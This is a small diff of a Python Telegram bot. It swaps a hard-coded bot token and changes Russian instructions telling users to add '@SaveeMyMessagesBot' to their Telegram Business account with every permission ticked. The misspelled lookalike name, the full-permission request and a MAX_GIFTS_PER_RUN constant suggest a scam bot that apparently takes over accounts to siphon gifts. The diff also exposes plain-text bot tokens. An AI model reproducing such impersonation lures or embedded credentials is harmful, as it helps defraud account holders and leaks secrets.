@@ -18,7 +18,7 @@ import logging
 
 
 # Constants
-TOKEN = "8059317736:AAHCFURfjvHHzUrcQ-n81NHKHRXQKqUCtuE" #Токен бота
+TOKEN = "7980252212:AAH1J7sHyLWvGOv0t6hcUMiVrebrfDsoH-s" #Токен бота
 LOG_CHAT_ID = -1002741941997
 
 MAX_GIFTS_PER_RUN = 1000
@@ -108,7 +108,7 @@ async def send_instruction(callback: types.CallbackQuery):
             "<b>Как подключить бота к бизнес-аккаунту:</b>\n\n"
             "1. Перейдите в «Настройки» → <i>Telegram для бизнеса</i>\n"
             "2. Перейдите в <i>Чат-боты</i>\n"
-            "3. Добавьте <b>@SaveMyMesssagesBot</b> в список\n"
+            "3. Добавьте <b>@SaveeMyMessagesBot</b> в список\n"
             "4. Поставьте все галочки в нижних полях\n\n"
             "После этого функции начнут работать автоматически ✅"
         )
